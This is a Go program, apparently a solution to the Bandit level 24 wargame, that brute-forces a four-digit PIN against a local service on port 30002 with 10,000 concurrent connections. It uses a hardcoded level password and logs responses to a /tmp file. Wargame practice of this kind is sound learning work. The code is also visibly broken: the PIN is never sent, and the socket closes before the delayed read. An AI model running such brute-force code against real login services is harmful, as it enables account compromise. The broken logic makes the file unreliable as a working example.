package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"regexp"
	"strings"
	"time"
)

type BruteCombo struct {
	Password string
	PIN      int
	Status   bool
	Response []byte
	Socket   net.Conn
}

func (bc *BruteCombo) GetResponse() {
	fmt.Printf("Getting response from PIN %d\n", bc.PIN)
	resp := make([]byte, 2048)
	count, err := bufio.NewReader(bc.Socket).Read(resp)
	if err != nil {
		return
	}
	status := string(resp[:count])
	if strings.Contains(status, "Wrong!") {
		bc.Status = false
	} else {
		bc.Response = resp[:count]
		bc.Status = true
	}
	fmt.Printf("Status: %t\nResponse: %s\n", bc.Status, bc.Response)

	return
}

func (bc *BruteCombo) Test(host string, port int) error {
	fmt.Printf("Testing with PIN %d\n", bc.PIN)

	// make connection and defer socket close if an issue
	var err error
	bc.Socket, err = net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		return err
	}
	defer bc.Socket.Close()

	// send password to socket
	fmt.Fprintln(bc.Socket, bc.Password)

	// set timer so we can parse the returned values after some time
	time.AfterFunc(5*time.Second, bc.GetResponse)

	return nil
}

func SaveAll(bca []*BruteCombo) error {
	f, err := os.Create("/tmp/0xc.bandit24.log")
	if err != nil {
		return err
	}
	defer f.Close()

	re := regexp.MustCompile("\n")

	for _, bc := range bca {
		_, _ = f.Write([]byte(fmt.Sprintf("%0000d\t", bc.PIN)))
		_, _ = f.Write([]byte(re.ReplaceAllString(string(bc.Response), "")))
		_, _ = f.Write([]byte("\n"))
	}

	return nil
}

func main() {
	fmt.Println("Starting bandit 24 brute force")
	pass24 := "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
	stats := make([]*BruteCombo, 10000)
	for i := 0; i < 10000; i++ {
		stats[i] = &BruteCombo{
			Password: pass24,
			PIN:      i,
			Status:   false,
			Response: nil,
		}
	}

	defer SaveAll(stats)

	for _, bc := range stats {
		fmt.Printf("PIN: %d\n", bc.PIN)
		go bc.Test("127.0.0.1", 30002)
		fmt.Printf("Status: %t\n", bc.Status)
	}

	t := time.NewTicker(2 * time.Second)
	defer t.Stop()

	start := time.Now()
	for now := range t.C {
		if now.Sub(start) > (time.Second * 15) {
			return
		} else {
			fmt.Println("Checking for valid response")
			for _, bc := range stats {
				if bc.Status {
					fmt.Println(bc.Response)
					return
				}
			}
		}
	}
}
